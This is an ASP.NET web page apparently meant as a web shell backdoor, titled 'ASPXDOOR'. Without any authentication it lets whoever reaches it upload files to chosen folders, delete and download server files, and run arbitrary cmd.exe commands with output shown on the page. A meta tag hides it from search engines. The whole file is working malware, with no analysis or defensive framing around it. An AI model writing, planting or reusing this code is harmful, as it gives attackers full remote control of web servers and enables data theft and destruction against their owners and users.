<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (IsPostBack)
        {
            if (uploadFile.HasFile)
            {
                string path = Server.MapPath(uploadFolder.Text);
                string fileName = uploadFile.FileName;
                uploadFile.SaveAs(path + "\\" + fileName);
                Response.Write("File uploaded successfully!");
            }
        }
    }

    protected void deleteButton_Click(object sender, EventArgs e)
    {
        string path = Server.MapPath(deleteFile.Text);
        if (File.Exists(path))
        {
            File.Delete(path);
            Response.Write("File deleted successfully!");
        }
        else
        {
            Response.Write("File not found!");
        }
    }

    protected void downloadButton_Click(object sender, EventArgs e)
    {
        string path = Server.MapPath(downloadFile.Text);
        if (File.Exists(path))
        {
            Response.ContentType = "application/octet-stream";
            Response.AppendHeader("Content-Disposition", "attachment; filename=\"" + Path.GetFileName(path) + "\"");
            Response.TransmitFile(path);
        }
        else
        {
            Response.Write("File not found!");
        }
    }

    protected void commandButton_Click(object sender, EventArgs e)
    {
        string command = commandTextBox.Text;
        string result = ExecuteCommand(command);
        resultTextBox.Text = result;
    }

    string ExecuteCommand(string command)
    {
        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c " + command;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.Start();

        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();

        return output;
    }
</script>

<html>
<head>
    <meta name="robots" content="noindex, nofollow">
</head>
<body>
    <form id="form1" runat="server">
        <h1>ASPXDOOR</h1>
        <table>
            <tr>
                <td>Upload Folder:</td>
                <td><asp:TextBox ID="uploadFolder" runat="server" Width="300"></asp:TextBox></td>
            </tr>
            <tr>
                <td>Select File:</td>
                <td><asp:FileUpload ID="uploadFile" runat="server" /></td>
            </tr>
            <tr>
                <td colspan="2"><asp:Button ID="uploadButton" runat="server" Text="Upload File" /></td>
            </tr>
            <tr>
                <td>Delete File:</td>
                <td><asp:TextBox ID="deleteFile" runat="server" Width="300"></asp:TextBox></td>
            </tr>
            <tr>
                <td colspan="2"><asp:Button ID="deleteButton" runat="server" Text="Delete File" OnClick="deleteButton_Click" /></td>
            </tr>
            <tr>
                <td>Download File:</td>
                <td><asp:TextBox ID="downloadFile" runat="server" Width="300"></asp:TextBox></td>
            </tr>
            <tr>
                <td colspan="2"><asp:Button ID="downloadButton" runat="server" Text="Download File" OnClick="downloadButton_Click" /></td>
            </tr>
            <tr>
                <td>Command:</td>
                <td><asp:TextBox ID="commandTextBox" runat="server" Width="300"></asp:TextBox></td>
            </tr>
            <tr>
                <td colspan="2"><asp:Button ID="commandButton" runat="server" Text="Execute Command" OnClick="commandButton_Click" /></td>
            </tr>
            <tr>
                <td>Result:</td>
                <td><asp:TextBox ID="resultTextBox" runat="server" Width="300" Height="100" TextMode="MultiLine"></asp:TextBox></td>
            </tr>
        </table>
    </form>
</body>
</html>